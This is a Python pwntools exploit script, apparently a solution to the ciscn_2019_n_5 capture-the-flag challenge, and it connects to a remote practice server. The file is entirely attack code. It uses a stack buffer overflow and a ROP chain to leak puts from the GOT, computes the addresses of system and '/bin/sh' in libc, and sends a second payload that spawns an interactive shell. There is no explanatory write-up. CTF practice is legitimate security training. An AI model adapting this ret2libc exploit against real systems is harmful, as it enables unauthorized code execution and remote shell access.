from pwn import *
from LibcSearcher import LibcSearcher
#sh = process("./ciscn_2019_n_5")
sh = remote("node5.buuoj.cn",27351) 
elf = ELF("ciscn_2019_n_5")
lib = ELF("libc-2.23.so")

main_adr = 0x400636
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pop_rdi = 0x0400713
ret = 0x04004c9
sh.recvuntil(b"name\n")
sh.sendline(p64(1))
sh.recvuntil(b"What do you want to say to me?\n")
payload1 = b"A"*(0x28) +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_adr)
sh.sendline(payload1)
puts_add = u64(sh.recv(6).ljust(8,b'\x00'))

print(hex(puts_add))

#libc = LibcSearcher("puts",puts_add)
#base = puts_add - libc.dump("puts")
system = puts_add - 0x31580
binsh = puts_add + 0x1334da
sh.recvuntil(b"name\n")
sh.sendline(p64(1))
sh.recvuntil(b"What do you want to say to me?\n")
payload2 = b"A"*0x28 + p64(pop_rdi) +p64(binsh) +p64(ret)+ p64(system)
sh.sendline(payload2)


sh.interactive()
